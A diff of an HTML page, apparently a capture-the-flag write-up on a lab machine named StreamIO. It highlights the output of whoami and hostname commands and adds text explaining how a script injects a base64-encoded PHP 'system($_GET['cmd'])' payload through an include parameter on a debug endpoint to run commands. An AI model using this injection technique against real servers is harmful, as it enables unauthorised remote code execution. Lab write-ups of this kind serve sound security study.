@@ -813,8 +813,8 @@ Fast forward, I have done it with curl, but you need the PHPSESSION cookie after
 <div class="highlight"><pre><span></span><code>[+] main
 CMD: whoami
 &lt;input name=&quot;include&quot; hidden&gt;
-&lt;/form&gt;
-streamio\yoshihide
+<span class="hll">&lt;/form&gt;
+</span>streamio\yoshihide
                 &lt;/div&gt;
         &lt;/center&gt;
 &lt;/body&gt;
@@ -822,12 +822,15 @@ streamio\yoshihide
 CMD: hostname
 &lt;input name=&quot;include&quot; hidden&gt;
 &lt;/form&gt;
-DC
-                &lt;/div&gt;
+<span class="hll">DC
+</span>                &lt;/div&gt;
         &lt;/center&gt;
 &lt;/body&gt;
 &lt;/html&gt;
 </code></pre></div>
+
+<p>The script logs in as yoshihide with the password we found in the users table. Using this session, the script asks for an input <em>cmd</em> and sends a POST to the <code>?debug</code> endpoint, were it includes <code>master.php</code>. As we know already, <code>master.php</code> interprets an include POST parameter. We set that base64 encoded <code>system($_GET['cmd']);</code>. In that request we also set the cmd parameter to our inputted cmd.</p>
+<p>The script trims the response a little to better see the output of the cmd.</p>
   </div>
   <div class="tag-cloud">
     <p>
